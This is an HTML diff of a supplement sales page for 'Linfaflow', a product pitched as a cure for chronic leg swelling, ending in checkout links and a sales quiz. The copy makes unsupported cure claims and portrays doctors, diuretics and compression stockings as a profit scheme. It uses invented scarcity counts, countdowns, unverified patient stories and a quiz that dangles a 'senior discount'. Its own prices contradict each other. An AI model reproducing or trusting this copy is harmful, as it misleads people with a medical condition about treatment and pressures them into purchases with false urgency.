+                    <p>Let me show you what treating swollen legs REALLY costs in America:</p>
+
+                    <div class="s1bx25">
+                        <p><strong>The "Compression + Medication" Route:</strong></p>
+                        <ul class="symlist">
+                            <li>Medical-grade compression stockings: $80–150 per pair (replaced every 3–6 months)</li>
+                            <li>Monthly doctor visits: $150–300</li>
+                            <li>Diuretic prescriptions (monthly): $30–150</li>
+                            <li><strong>Annual total: $3,000–$5,400</strong></li>
+                        </ul>
+                        <p>(Plus the indignity of wrestling stockings over swollen legs every single morning.)</p>
+                    </div>
+
+                    <div class="s1bx25">
+                        <p><strong>The "Vein Procedure" Route:</strong></p>
+                        <ul class="symlist">
+                            <li>Initial vein mapping and consultation: $500</li>
+                            <li>Duplex ultrasound: $500–1,000</li>
+                            <li>Vein ablation or sclerotherapy: $3,000–$10,000 per leg</li>
+                            <li><strong>Total: $4,000–$11,500</strong></li>
+                        </ul>
+                        <p>(For a procedure that doesn't even address the inflammatory capillary leaking driving your
+                            edema.
+                            And many insurers deny coverage, calling it "cosmetic.")</p>
+                    </div>
+
+                    <div class="s1bx25">
+                        <p><strong>The "Wound Care" Route (Where This Is All Heading):</strong></p>
+                        <ul class="symlist">
+                            <li>Venous ulcer treatment: $15,000–$30,000+ per episode</li>
+                            <li>Weekly wound care visits for months</li>
+                            <li>Specialized dressings and antibiotics</li>
+                            <li><strong>Total: Your savings... your mobility... your dignity.</strong></li>
+                        </ul>
+                    </div>
+
+                    <p>The medical industry LOVES that progression.</p>
+
+                    <p>You know why? Because every stage costs more than the last. Swollen legs lead to skin changes.
+                        Skin
+                        changes lead to ulcers. Ulcers lead to wound care centers. And wound care is a $70 billion
+                        industry
+                        that only exists because nobody bothered to fix the swelling early.</p>
+
+                    <p>It's a goldmine built on human suffering.</p>
+
+                    <p>But here's what really pisses them off...</p>
+
+                    <p>Linfaflow should cost <strong>$180 per bottle</strong>. That's what similar medical-grade
+                        botanical formulations sell for in specialty vein clinics. Hell, that's close to what the prototype cost me
+                        to
+                        develop.</p>
+
+                    <p>But I didn't create this to get rich. I created it because I read Ruth's desperate survey
+                        response.
+                        Because Sharon was hiding her legs under oversized scrubs. Because Frank's wife was pulling his
+                        shoes off every night.</p>
+
+                    <p>So here's the deal: The regular price is <strong>$69 per bottle</strong>. Already 67% less than ONE
+                        MONTH of typical treatment.</p>
+
+                    <p>But that's not what you'll pay today.</p>
+
+                    <h2><strong>THE 70% OFF "MIDDLE FINGER" TO THE MEDICAL ESTABLISHMENT</strong></h2>
+                    <img src="images/flag.png" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>Remember those cease and desist letters I mentioned? The threats? The blacklisting?</p>
+
+                    <p>Well, I just got word that a major medical device company is trying to patent-block our formula.
+                    </p>
+
+                    <p>They can't copy it (we have iron-clad patents). They can't buy me out (I told them to pound
+                        sand). So
+                        now they're trying to bury us in legal fees and regulatory red tape.</p>
+
+                    <p>My response?</p>
+
+                    <p><strong>I'm putting our entire inventory on sale at up to 70% OFF.</strong></p>
+
+                    <p>That's right. As low as <strong>$19.99 per bottle</strong>.</p>
+
+                    <p>Less than ONE vein clinic copay. Less than your monthly diuretic prescription. Less than those
+                        compression stockings collecting dust in your drawer.</p>
+
+                    <p>For the ONLY formula that actually fixes the root cause of chronic leg swelling.</p>
+
+                    <p>Why would I do this? Because every person who gets relief is living proof the system failed them.
+                        Because I want thousands of success stories flooding the internet before these medical industry
+                        vultures can shut us down.</p>
+
+                  
+
+                    <img src="images/image4.png" class="img-responsive" style="margin: 20px 0;">
+
+                    <!-- SECTION: THE CATCH -->
+                    <h2><strong>BUT HERE IS THE CATCH (AND IT'S A BIG ONE)</strong></h2>
+
+                    <p>This discount won't last forever. Not because I'm playing marketing games.</p>
+
+                    <p>But because Linfaflow relies on a high-grade botanical complex that requires a
+                        <strong>6-week
+                            extraction process</strong>.
+                    </p>
+
+                    <p>We cannot just "make more" overnight. We've sold out 11 times in the past.</p>
+
+                    <p>Also... and this is important... we only have <strong>2,184 units left at this price</strong>.
+                        Our
+                        lab can only produce 500 per week.</p>
+
+                    <p>If you're reading this right now, units are still available. But I cannot promise they'll last
+                        through the weekend.</p>
+
+                    <p>And here's the thing... Every minute you wait is another minute you're:</p>
+
+                    <ul class="symlist">
+                        <li>Feeding the vein clinics and vascular surgeons who profit from your swelling getting worse
+                        </li>
+                        <li>Enriching the pharmaceutical companies selling diuretics that strain your body</li>
+                        <li>Living in unnecessary discomfort and embarrassment</li>
+                        <li>Getting closer to the skin breakdown and ulcers that turn a $19.99 problem into a $30,000
+                            nightmare
+                        </li>
+                    </ul>
+
+                    <p>While the solution is sitting right here... for less than a night out at dinner.</p>
+
+                    <div class="midtxtbx1">
+                        <p>THIS DISCOUNT EXPIRES IN 72 HOURS. After that, the price goes back to $59. And units are
+                            selling out FAST.</p>
+                    </div>
+
+
+                    <!-- SECTION: GUARANTEE -->
+                    <h2><strong>MY PERSONAL 60-DAY "NORMAL LEGS OR IT'S FREE" GUARANTEE</strong></h2>
+                    <img src="images/image11.jpg" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>Look, I get it. You've been burned before. Spent money on "miracle cures" that turned out to be
+                        expensive garbage.</p>
+
+                    <p>So here's my promise:</p>
+
+                    <p>Try Linfaflow for <strong>60 full days</strong>. Use it every single day.
+                        Twice a
+                        day if you want. Feel the heaviness lift. Feel the swelling shrink. Feel your confidence come
+                        back.
+                    </p>
+
+                    <p>And if you don't look down at your legs one evening and think... <em>"Holy crap, I can see my
+                            ankles
+                            again"</em>...</p>
+
+                    <p>I'll refund every penny.</p>
+
+                    <p>No forms to fill out. No "store credit" nonsense. No questions asked. Just email <strong>support@linfaflow.com</strong> and say "It didn't work." Your
+                        refund hits within 48 hours.</p>
+
+                    <p>Why am I so confident? Because our refund rate is 0.4%. That's FOUR people per thousand. And two
+                        of
+                        those were because their dog knocked the BOTTLE off the counter.</p>
+
+                    <p>The formula works. Period.</p>
+
+                    <p>And no, this isn't the type of guarantee every other company throws around nowadays. This is no
+                        gimmick.</p>
+
+                    <p>Want proof? Try emailing or calling our customer service.</p>
+
+                    <p>You can literally reach us 24/7. Simply call our support team at <strong>+1 (800) 390-6035</strong> or email them at <strong>support@linfaflow.com</strong>. We respond
+                        to
+                        every single email within minutes. We answer every single phone call. It may sound old-fashioned
+                        but
+                        our customers are our absolute #1 priority. Period.</p>
+
+
+                    <!-- SECTION: THE CHOICE -->
+                    <h2><strong>THE CHOICE THAT WILL DEFINE YOUR NEXT DECADE</strong></h2>
+                    <img src="images/image7.jpg" class="img-responsive" style="margin: 20px 0;">
+
+                    <p>Six months ago, Ruth couldn't look at her own legs without crying.</p>
+
+                    <p>She'd done everything right. Compression stockings. Diuretics. Two vein specialists. $4,000 in
+                        treatments that worked for a few hours... then the flood came back.</p>
+
+                    <p>Today? She just sent me a photo from the community pool. Legs out. Grandkids climbing on her lap.
+                        No
+                        stockings. No cover-up. Just... her legs. The ones she thought she'd lost forever.</p>
+
+                    <p>The only thing that changed? She stopped draining the flood and started sealing the leak.</p>
+
+                    <p>That's what Linfaflow does. And that's the same choice sitting in front of you right now.
+                    </p>
+
+                    <p>You can keep wrestling compression stockings over swollen calves every morning. Keep swallowing
+                        pills
+                        that drain your energy right along with the fluid. Keep hiding under long pants in July while the
+                        valves get weaker and the capillaries leak faster... month by month... edging closer to the skin
+                        breakdown.</p>
+
+                    <p>Or you can do what Ruth did. What Frank did. What Beverly did. What over 1,000 people have done
+                        when
+                        they finally got sick of bailing water out of a boat with a hole in the bottom.</p>
+
+                    <p><strong>Seal the damn hole.</strong></p>
+
+                    <p>$19.99. Less than one copay at the vein clinic that wasn't fixing anything anyway.</p>
+
+                    <p>60 days to decide if it works.</p>
+
+                    <p>Your legs have been drowning long enough.</p>
+
+                    <h2><strong>HERE IS EXACTLY WHAT TO DO NEXT</strong></h2>
+ <img src="images/checkavail.png" class="img-responsive" style="margin: 20px 0;">
+                    <ol>
+                        <li>Click the button below that says <strong>"APPLY DISCOUNT &amp; CHECK AVAILABILITY"</strong>
+                        </li>
+                        <li>Choose your package (Pro tip: Get at least <strong>3 bottles</strong>. You'll want backups when
+                            this works. Plus you'll save more.)</li>
+                        <li>Fill out your shipping info (We ship <strong>same-day</strong> if you order before 3pm EST)
+                        </li>
+                        <li>Wait for your package to arrive (Usually <strong>3-5 days</strong>)</li>
+                        <li>Use it <strong>the moment it shows up</strong></li>
+                        <li>Email us your success story in a week (Seriously. Our team loves hearing these: <strong>support@linfaflow.com</strong>)
+                        </li>
+                    </ol>
+
+                    <p>But whatever you do... Don't close this page thinking <strong>"I'll order later."</strong></p>
+
+                    <p>Later doesn't exist when your legs are getting worse. Later is another evening <strong>hiding
+                            behind
+                            long pants</strong>. Later is another month closer to <strong>skin breakdown</strong>. Later
+                        is
+                        the discount expiring and inventory running out.</p>
+
+                    <p>Your legs have waited long enough. Click below and let's end this nightmare.</p>
+
+
+
+                    <!-- FINAL CTA -->
+                    <div class="ctabox">
+                        <a href="https://cc.linfaflow.com/dtcnew/checkout.php?hid=b2lkPW9mZl8wMDQyMzQ2JmFpZD1hZmZfMDU5NzY5NCZ1aWQ9YmxfNjY2ODExMQ%3D%3D&affid=aff_0597694">
+                            <img src="images/package3.png" class="img-responsive">
+                        </a>
+                        <center>
+                            <a href="https://cc.linfaflow.com/dtcnew/checkout.php?hid=b2lkPW9mZl8wMDQyMzQ2JmFpZD1hZmZfMDU5NzY5NCZ1aWQ9YmxfNjY2ODExMQ%3D%3D&affid=aff_0597694" class="ctabut">APPLY DISCOUNT &amp; CHECK
+                                AVAILABILITY</a>
+                        </center>
+                    </div>
+
+                    <p style="text-align:center; font-size:20px;"><strong>GET 70% OFF Linfaflow Now!</strong>
+                    </p>
+                    <p style="text-align:center;"><strong>LIMITED TIME READER-ONLY SPECIAL:</strong> Ordering now makes
+                        you
+                        eligible for 70% OFF Linfaflow. Only available here. Limited to first few 1,000
+                        customers only.
+                    </p>
+                    <p style="text-align:center;">This offer expires soon.</p>
+
+                    <!-- P.S. SECTION -->
+                    <p><strong>With hope,</strong><br>
+                        Dr. Andy Salazar<br>
+                        Peak Health Research</p>
+
+                    <p><strong>P.S.</strong> Ruth just sent me a photo from the community pool. She's in a swimsuit.
+                        Sitting
+                        by the water with her grandkids. Legs out. No compression stockings. No cover-up. Just... normal
+                        legs. And a smile I can feel through the screen. That could be you in a few weeks. But only if
+                        you
+                        act now.</p>
+
+                    <p><strong>P.P.S.</strong> Chronic venous disease affects more than 190 million Americans... that's
+                        1.5
+                        times more people than all cardiovascular diseases combined. Yet most doctors treat swollen legs
+                        as
+                        an afterthought. This formula addresses what's ACTUALLY happening inside your veins and
+                        capillaries.
+                        Real science. Real results.</p>
+
+                    <p><strong>P.P.P.S.</strong> Seriously, we're down to 2,184 units. By the time you finish reading
+                        this,
+                        we could be under 2,000. When I refresh and see it below 1,000, I'm pulling this page. Don't say
+                        I
+                        didn't warn you.</p>
+                    
+                      <!-- FINAL CTA -->
+                    <div class="ctabox">
+                        <a href="https://cc.linfaflow.com/dtcnew/checkout.php?hid=b2lkPW9mZl8wMDQyMzQ2JmFpZD1hZmZfMDU5NzY5NCZ1aWQ9YmxfNjY2ODExMQ%3D%3D&affid=aff_0597694">
+                            <img src="images/package3.png" class="img-responsive">
+                        </a>
+                        <center>
+                            <a href="https://cc.linfaflow.com/dtcnew/checkout.php?hid=b2lkPW9mZl8wMDQyMzQ2JmFpZD1hZmZfMDU5NzY5NCZ1aWQ9YmxfNjY2ODExMQ%3D%3D&affid=aff_0597694" class="ctabut">APPLY DISCOUNT &amp; CHECK
+                                AVAILABILITY</a>
+                        </center>
+                    </div>
+
+                    <!-- FOOTER / DISCLAIMER -->
+                    <div class="reference">
+                        <hr>
+                        <p><strong>References</strong></p>
+                        <ul class="ref-list">
+                            <li> https://pubmed.ncbi.nlm.nih.gov/20736894/</li>
+                            <li>https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4124142/</li>
+                            <li> https://pubmed.ncbi.nlm.nih.gov/21412369/</li>
+                            <li> https://pubmed.ncbi.nlm.nih.gov/26516498/</li>
+                            <li> https://pubmed.ncbi.nlm.nih.gov/19566031/</li>
+                            <li>https://www.ijmedicine.com/index.php/ijam/article/view/576</li>
+                            <li>https://pubmed.ncbi.nlm.nih.gov/16949230/</li>
+                            <li>https://www.nature.com/articles/s41598-020-62749-7</li>
+                            <li>https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4706087/</li>
+                            <li>https://pubmed.ncbi.nlm.nih.gov/16207646/</li>
+                            <li> https://pubmed.ncbi.nlm.nih.gov/32721140/#</li>
+                            <li> https://pubmed.ncbi.nlm.nih.gov/24796079/</li>
+                            <li> https://www.ncbi.nlm.nih.gov/pmc/articles/PMC1781083/</li>
+                            <li> https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4765057/</li>
+                            <li> https://www.ncbi.nlm.nih.gov/pmc/articles/PMC8067852/</li>
+                            <li> https://www.sciencedirect.com/topics/medicine-and-dentistry/s-adenosyl-methionine</li>
+                            <li> https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4728667/</li>
+                            <li> https://pubmed.ncbi.nlm.nih.gov/23072529/</li>
+                            <li> https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3500919/</li>
+                            <li> https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4631430/</li>
+                        </ul>
+                        <p style="font-size:12px;"><strong>THIS IS AN ADVERTISEMENT AND NOT AN ACTUAL NEWS ARTICLE,
+                                BLOG, OR CONSUMER PROTECTION UPDATE.</strong></p>
+                        <ul class="footer-content">
+                            <li style="font-size:12px;">These statements have not been evaluated by the Food and Drug
+                                Administration. This product is not intended to diagnose, treat, cure, or prevent any
+                                disease. The information provided on this site is for informational purposes only and is
+                                not intended as a substitute for advice from your physician or other health care
+                                professional or any information contained on or in any product label or packaging. You
+                                should not use the information on this site for diagnosis or treatment of any health
+                                problem or for prescription of any medication or other treatment. You should consult
+                                with a healthcare professional before starting any diet, exercise or supplementation
+                                program, before taking any medication, or if you have or suspect you might have a health
+                                problem.</li>
+                        </ul>
+                        <a href="https://cc.linfaflow.com/dtcnew/lgl/contact-us.php">Contact</a> | <a
+                            href="https://cc.linfaflow.com/dtcnew/lgl/refund-policy.php">Refund Policy</a> | <a
+                            href="https://cc.linfaflow.com/dtcnew/lgl/privacy-policy.php">Privacy Policy</a> | <a
+                            href="https://cc.linfaflow.com/dtcnew/lgl/terms-of-service.php">Terms of Use</a>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+
+        <!-- QUALIFICATION QUIZ (opens on CTA click) -->
+        <div id="quizOverlay" role="dialog" aria-modal="true" aria-label="Linfaflow qualification quiz">
+            <div class="quiz-container">
+                <div class="quiz-header">
+                    <a href="#" class="back-arrow" id="back-btn">&larr;</a>
+                    <h1>Get 70% Off Linfaflow</h1>
+                </div>
+                <div class="qz-progress-bar">
+                    <div class="qz-progress" id="progress"></div>
+                </div>
+                <div id="quiz">
+                    <div class="question" id="question1">
+                        <h2>1. Are you over the age of 50?</h2>
+                        <p>*If yes, you get a senior discount*</p>
+                        <div class="options">
+                            <label>
+                                <input type="radio" name="age" value="yes">
+                                <span>Yes</span>
+                            </label>
+                            <label>
+                                <input type="radio" name="age" value="no">
+                                <span>No</span>
+                            </label>
+                        </div>
+                        <div class="warning-message" id="warning1">Please select an option before continuing.</div>
+                    </div>
+
+                    <div class="question" id="question2" style="display: none;">
+                        <h2>2. Where is your main area of concern?</h2>
+                        <p>*Select all that apply*</p>
+                        <div class="options">
+                            <label>
+                                <input type="checkbox" name="pain" value="Low back">
+                                <span>Swollen Ankles &amp; Feet</span>
+                            </label>
+                            <label>
+                                <input type="checkbox" name="pain" value="Hips">
+                                <span>Painful Swelling &amp; Inflammation</span>
+                            </label>
+                            <label>
+                                <input type="checkbox" name="pain" value="Buttocks">
+                                <span>Trouble Fitting Into Shoes or Clothes</span>
+                            </label>
+                            <label>
+                                <input type="checkbox" name="pain" value="Legs">
+                                <span>Other</span>
+                            </label>
+                        </div>
+                        <div class="warning-message" id="warning2">Please select at least one option before continuing.</div>
+                    </div>
+
+                    <div class="question" id="question3" style="display: none;">
+                        <h2>3. What&rsquo;s your biggest concern right now?</h2>
+                        <div class="options">
+                            <label>
+                                <input type="checkbox" name="concern" value="Low back">
+                                <span>It's getting worse</span>
+                            </label>
+                            <label>
+                                <input type="checkbox" name="concern" value="Hips">
+                                <span>I hate not being able to move freely</span>
+                            </label>
+                            <label>
+                                <input type="checkbox" name="concern" value="Buttocks">
+                                <span>I'm worried about long-term damage</span>
+                            </label>
+                            <label>
+                                <input type="checkbox" name="concern" value="Legs">
+                                <span>I just want relief now</span>
+                            </label>
+                        </div>
+                        <div class="warning-message" id="warning3">Please select at least one option before continuing.</div>
+                    </div>
+
+                    <div class="question" id="question4" style="display: none;">
+                        <h2>4. How committed are you to finding a natural solution that works?</h2>
+                        <div class="options">
+                            <label>
+                                <input type="checkbox" name="commitment" value="Low back">
+                                <span>I&rsquo;ve been searching for something just like this.</span>
+                            </label>
+                            <label>
+                                <input type="checkbox" name="commitment" value="Hips">
+                                <span>I&rsquo;m ready to try anything that actually works.</span>
+                            </label>
+                            <label>
+                                <input type="checkbox" name="commitment" value="Buttocks">
+                                <span>I&rsquo;m hopeful, but skeptical.</span>
+                            </label>
+                        </div>
+                        <div class="warning-message" id="warning4">Please select at least one option before continuing.</div>
+                    </div>
+
+                    <div class="question" id="question5" style="display: none;">
+                        <h2>5. Select Your Package Size</h2>
+                        <div class="options">
+                            <label>
+                                <input type="radio" name="package" value="6">
+                                <img class="package-image" src="images/bundle-3plus3.webp" alt="Buy 3 Get 3 Free">
+                                <div class="package-info">
+                                    <span class="package-title">BUY 3 GET 3 FREE</span>
+                                    <span class="package-price">$19.99/Bottle</span>
+                                    <span class="shipping-price"><em>Free Shipping</em></span>
+                                </div>
+                                <span class="package-label">Most Popular</span>
+                            </label>
+
+                            <label>
+                                <input type="radio" name="package" value="3">
+                                <img class="package-image" src="images/bundle-1plus1.webp" alt="Buy 1 Get 1 Free">
+                                <div class="package-info">
+                                    <span class="package-title">BUY 1 GET 1 FREE</span>
+                                    <span class="package-price">$34.75/Bottle</span>
+                                    <span class="shipping-price"><em>Free Shipping</em></span>
+                                </div>
+                            </label>
+
+                            <label>
+                                <input type="radio" name="package" value="1">
+                                <img class="package-image" src="images/bundle-2plus2.webp" alt="Buy 2 Get 2 Free">
+                                <div class="package-info">
+                                    <span class="package-title">BUY 2 GET 2 FREE</span>
+                                    <span class="package-price">$27.49/Bottle</span>
+                                    <span class="shipping-price"><em>Free Shipping</em></span>
+                                </div>
+                            </label>
+                        </div>
+                        <div class="warning-message" id="warning5">You Must Select a Package</div>
+                    </div>
+                </div>
+
+                <div id="discount-animation" style="display: none;">
+                    <h2>Calculating Your Discount...</h2>
+                    <div class="discount-circle">
+                        <svg viewBox="0 0 100 100">
+                            <circle class="background" cx="50" cy="50" r="45" />
+                            <circle class="progress" cx="50" cy="50" r="45" />
+                        </svg>
+                        <div class="discount-percentage">0%</div>
+                    </div>
+                </div>
+
+                <button id="next-btn">Next</button>
+            </div>
+        </div>
+        <script src="js/page.js"></script>
+
+</body>
+
+</html>
